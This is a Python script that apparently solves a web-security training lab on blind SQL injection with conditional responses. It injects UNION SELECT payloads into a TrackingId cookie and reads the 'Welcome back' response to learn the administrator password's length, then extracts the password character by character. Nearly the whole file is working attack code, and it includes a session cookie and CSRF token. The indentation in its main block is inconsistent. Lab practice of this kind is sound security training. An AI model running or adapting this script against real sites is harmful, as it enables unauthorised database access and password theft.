#Blind SQL injection with conditional responses

import requests,sys

requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)



def sql_engine(payload):
	proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

	host="https://acaf1f4b1f4c257180d61f4200e8008c.web-security-academy.net/login"

	#s = request.Session()

	headers={"Cookie": "TrackingId=x'%s ; session=x7Z7uwNcodZOU4ONwTBRiiqllv60dukp" %payload}		
	data = {"csrf":"PXtV2GasVZG4MPmmG1Y7UMxcMIKN2VvD","username":"wiener","password":"peter"}

	r = requests.post(host,headers=headers,data=data, proxies=proxies, verify=False)

	return r.text

def check_pass_length():

	length=""
	for i in range(1,50):
		payload_pass_length="+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>%s--" %i
		
		req = sql_engine(payload_pass_length)
		#print(req)
		if "Welcome back" not in req:
			print (i)
			length = i 
			break
	print ("length of the password is %s" %length)

	return length


def get_pass():
	extracted = ""
	for i in range(1,21):
		payload_pass="+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+(ascii(substring(password,%s,1)))=[CHAR]--" %i
		for j in range(32,126): #loop every possible character in the ASCII printable set
			payload =payload_pass.replace("[CHAR]",str(j))

			req = sql_engine(payload)

			if "Welcome back" in req:
				extracted += chr(j)
				extracted_char = chr(j)
				sys.stdout.write(extracted_char)
				sys.stdout.flush()
				break

	return extracted


if __name__ == "__main__":
  check_pass_length()
	get_pass()

